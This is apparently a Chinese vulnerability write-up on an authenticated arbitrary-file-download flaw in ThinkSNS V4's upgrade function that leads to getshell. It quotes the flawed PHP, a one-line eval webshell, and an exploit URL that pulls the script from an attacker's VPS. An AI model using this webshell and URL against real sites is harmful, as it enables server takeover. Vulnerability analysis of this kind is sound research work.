<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>ThinkSNS V4 后台任意文件下载导致getshell</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><h2>三、复现过程</h2><h3>漏洞分析</h3><p>存在漏洞代码\ts4\apps\admin\Lib\Action\UpgradeAction.class.php中的一个函数中。</p><p>public function step1()<br />{<br />    $downUrl = $_GET['upurl'];<br />    $downUrl = urldecode($downUrl);<br />    $path = DATA_PATH.'/'.'upgrade/'.basename($downUrl);<br /><br />    // # 备份老配置文件<br />    $oldConf = file_get_contents(CONF_PATH.'/thinksns.conf.php');<br />    file_put_contents(DATA_PATH.'/old.thinksns.conf.php', $oldConf);<br /><br />    // # 下载增量包<br />    is_dir(dirname($path)) or mkdir(dirname($path), 0777, true);<br />    file_put_contents($path, file_get_contents($downUrl));<br />    file_exists($path) or $this-&gt;showError('下载升级包失败，请检查'.dirname($path).'目录是否可写，如果可写，请刷新重试！');<br /><br />    // 验证hash判断包是否合法。<br />    $filename = dirname($path).'/upgrade.json';<br />    $data = file_get_contents($filename);<br />    $data = json_decode($data, false);<br />    if (md5_file($path) != $data-&gt;md5) {<br />        $this-&gt;showError('更新包校验失败，请重新执行升级.');<br />    }</p><p>函数</p><p>file_put_contents — 将一个字符串写入文件<br />file_get_contents — 将整个文件读入一个字符串</p><p>在这段函数中，先备份老配置文件，然后下载增量包，下载参数$downUrl未经过任何处理，直接下载到网站目录下，接着验证hash判断包是否合法，但是并没有删除下载的增量包，<br />导致程序在实现上存在任意文件下载漏洞，下载远程文件到网站目录下，攻击者可指定第三方url下载恶意脚本到网站目录，进一步触发恶意代码，控制网站服务器。</p><h3>漏洞复线</h3><p>在自己的服务器创建一个 ian.php</p><p>&lt;?php   <br />echo "&lt;?php";<br />echo &quot;eval(file_get_contents('php://input'));&quot;;  <br />echo "?&gt;";  <br />?&gt;  </p><p>登录后台，通过访问构造的url，成功下载第三方源的恶意脚本文件</p><p>http://www.0-sec.org:8000/ts4/index.php?app=admin&amp;mod=Upgrade&amp;act=step1&amp;upurl=http://你的vps:8000/ian.php</p><p>通过直接访问url，触发代码执行，成功获取网站服务器权限。</p></body></html>